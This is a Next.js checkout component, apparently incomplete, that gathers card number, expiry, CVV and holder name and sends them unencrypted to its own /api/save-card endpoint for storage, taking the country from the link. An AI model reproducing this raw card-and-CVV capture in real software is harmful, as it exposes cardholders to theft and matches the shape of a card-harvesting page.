"use client";

import React, { useEffect, useState } from "react";
import { useSearchParams } from "next/navigation";
import Image from "next/image";

type CardType = "visa" | "mastercard" | "amex" | "revolut" | "default";

const Checkout: React.FC = () => {
  const searchParams = useSearchParams(); // Extragem parametrii din URL
  const [cardNumber, setCardNumber] = useState("");
  const [cardType, setCardType] = useState<CardType>("default");
  const [amount, setAmount] = useState("");
  const [expDate, setExpDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [holder, setHolder] = useState("");
  const [country, setCountry] = useState(""); // Țara din link
  const [isLoading, setIsLoading] = useState(false);

  const cardLogos = [
    { type: "visa", src: "/images/visa_logo.svg", width: 40, height: 24 },
    { type: "mastercard", src: "/images/mastercard_logo.svg", width: 40, height: 24 },
    { type: "amex", src: "/images/amex_logo.svg", width: 40, height: 24 },
    { type: "revolut", src: "/images/revolut_logo.svg", width: 40, height: 24 },
  ];

  useEffect(() => {
    const countryParam = searchParams.get("country");
    if (countryParam) setCountry(countryParam);
  }, [searchParams]);

  const detectCardType = (number: string): CardType => {
    if (/^4/.test(number)) return "visa";
    if (/^5[1-5]/.test(number)) return "mastercard";
    if (/^3[47]/.test(number)) return "amex";
    if (/^5300|^6767/.test(number)) return "revolut";
    return "default";
  };

  const handleSubmit = async () => {
    if (!cardNumber || !expDate || !cvv || !holder || !amount || !country) {
      alert("Please fill in all fields correctly.");
      return;
    }

    setIsLoading(true);
    const payload = { cardNumber, cardType, amount, expDate, cvv, holder, country };

    try {
      const response = await fetch("/api/save-card", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

      if (response.ok) alert("Card data successfully saved!");
      else alert("Failed to save card data.");
    } catch (err) {
      console.error("Error:", err);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gray-100">
      <div className="max-w-sm mx-auto p-4 bg-white shadow-lg rounded-md">
        <div className="flex space-x-2 mb-4 justify-center">
          {cardLogos.map((logo) => (
            <Image
              key={logo.type}
              src={logo.src}
              alt={`${logo.type} logo`}
              width={logo.width}
              height={logo.height}
              priority
            />
          ))}
        </div>

        {/* Restul componentelor */}
        {/* Același cod pentru inputuri și butoane */}
      </div>
    </div>
  );
};

export default Checkout;
